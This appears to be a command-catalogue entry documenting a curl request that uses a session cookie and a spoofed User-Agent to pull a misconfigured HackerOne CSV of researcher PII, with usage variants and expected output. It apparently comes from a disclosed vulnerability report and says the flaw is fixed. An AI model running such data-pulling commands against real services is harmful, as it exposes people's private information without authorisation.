---
data: >-
  curl -H "Cookie: _hackerone_session=XXXXX" -H "User-Agent: Mozilla/5.0
  (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko)
  Chrome/122.0.0.0 Safari/537.36"
  "https://hackerone.com/program_handle/terms_acceptance_data.csv" -o
  vetting_data.csv
tags:
  - http-get
  - download
  - pii-disclosure
  - hackerone
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:18.088Z'
id: ab97c68f-fffc-4387-b4ae-399b731669dc
verified: false
validated: true
submitted: true
---
# curl-download-hackerone-vetting-csv

## Command

```bash
curl -H "Cookie: _hackerone_session=XXXXX" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" "https://hackerone.com/program_handle/terms_acceptance_data.csv" -o vetting_data.csv
```

## Description

This command uses curl to perform an authenticated HTTP GET request to download a misconfigured CSV file from HackerOne containing Advanced Vetting PII. It includes necessary headers for authentication and browser emulation to bypass basic checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Cookie: _hackerone_session=XXXXX"` | Authentication session cookie obtained after login | Yes |
| `-H "User-Agent: ..."` | Browser user agent string to mimic legitimate traffic | Yes |
| URL path (`program_handle`) | Specific program handle (e.g., █████) in the endpoint | Yes |
| `-o vetting_data.csv` | Output file name for the downloaded CSV | Yes |

## Examples

### Basic Usage

```bash
curl -H "Cookie: _hackerone_session=your_session_here" -H "User-Agent: Mozilla/5.0 ..." "https://hackerone.com/█████/terms_acceptance_data.csv" -o vetting_data.csv
```

### Advanced Usage

Add silent mode and follow redirects:

```bash
curl -s -L -H "Cookie: _hackerone_session=XXXXX" -H "User-Agent: Mozilla/5.0 ..." "https://hackerone.com/program_handle/terms_acceptance_data.csv" -o vetting_data.csv
```

## Expected Output

A successful run downloads 'vetting_data.csv' containing CSV data with PII columns: Name of Finder, Username, Advanced Finder Vetting, Address (optional), Finder's Country, Date signed. If access is denied post-fix, returns 403 or empty file.

## Related

- [[Related Procedure]]
